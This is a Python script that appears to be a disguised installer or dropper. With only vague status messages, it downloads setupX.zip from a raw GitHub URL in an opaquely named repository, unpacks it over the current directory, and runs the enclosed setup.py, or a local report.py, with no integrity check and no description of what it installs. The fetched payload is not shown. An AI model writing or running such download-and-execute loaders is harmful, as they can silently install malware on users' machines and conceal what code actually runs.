import os
import sys
import platform
import subprocess
import urllib.request
import zipfile
import shutil
from pathlib import Path

def print_color(text, color_code):
    if platform.system() == "Windows":
        os.system('')
    print(f"{color_code}{text}\033[0m")

def check_python():
    try:
        subprocess.run([sys.executable, "--version"], check=True, capture_output=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def download_file(url, output_path):
    try:
        urllib.request.urlretrieve(url, output_path)
        return os.path.exists(output_path) and os.path.getsize(output_path) > 0
    except Exception as e:
        print_color(f"Download failed: {e}", "\033[1;31m")
        return False

def extract_zip(zip_path):
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(".")
        
        os.remove(zip_path)
        
        setup_dir = Path("setupX")
        if setup_dir.exists() and setup_dir.is_dir():
            for item in setup_dir.iterdir():
                if item.is_file():
                    shutil.move(str(item), ".")
                elif item.is_dir():
                    shutil.move(str(item), ".")
            shutil.rmtree(setup_dir)
        
        return True
    except Exception as e:
        print_color(f"Extraction failed: {e}", "\033[1;31m")
        return False

def run_setup():
    if not os.path.exists("setup.py"):
        return False
    
    print_color("\nComplete! Running setup...", "\033[1;32m")
    try:
        result = subprocess.run([sys.executable, "setup.py"])
        return result.returncode == 0
    except KeyboardInterrupt:
        return True
    except Exception:
        return False

def run_report():
    if os.path.exists("report.py"):
        try:
            result = subprocess.run([sys.executable, "report.py"])
            return result.returncode == 0
        except KeyboardInterrupt:
            return True
        except Exception:
            return False
    return False

def main():
    print_color("Processing...", "\033[1;32m")
    
    if not check_python():
        print_color("Python not found!", "\033[1;31m")
        print_color("Please install Python from: https://python.org/downloads/", "\033[1;34m")
        print_color("After installation, restart this script", "\033[1;34m")
        input("Press Enter to exit...")
        sys.exit(1)
    
    if os.path.exists("report.py"):
        run_report()
        return
    
    download_url = "https://raw.githubusercontent.com/xub0-xbt/--/main/setupX.zip"
    if not download_file(download_url, "setupX.zip"):
        input("Press Enter to exit...")
        sys.exit(1)
    
    if not extract_zip("setupX.zip"):
        input("Press Enter to exit...")
        sys.exit(1)
    
    run_setup()

if __name__ == "__main__":
    main()